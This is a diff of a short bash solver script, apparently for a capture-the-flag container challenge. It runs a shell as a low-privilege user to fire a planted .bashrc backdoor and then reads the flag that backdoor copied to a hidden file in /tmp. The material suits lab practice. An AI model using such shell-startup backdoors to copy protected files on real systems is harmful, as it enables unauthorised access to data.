@@ -1,9 +1,10 @@
 #!/bin/bash
-set -euo pipefail
-CONTAINER_NAME="challenge3"
+set -e
 
-echo "[*] Triggering interactive shell to execute the .bashrc backdoor..."
-docker exec -u ctfuser "$CONTAINER_NAME" bash -ic 'true' >/dev/null
+CONTAINER="challenge3"
 
-echo "[*] Reading copied flag from /tmp/.cachefile..."
-docker exec -u ctfuser "$CONTAINER_NAME" bash -lc 'cat /tmp/.cachefile'
+echo "[*] Triggering login shell to execute .bashrc backdoor..."
+docker exec -u ctfuser $CONTAINER bash -lc 'true'
+
+echo "[*] Reading copied flag..."
+docker exec -u ctfuser $CONTAINER cat /tmp/.cachefile
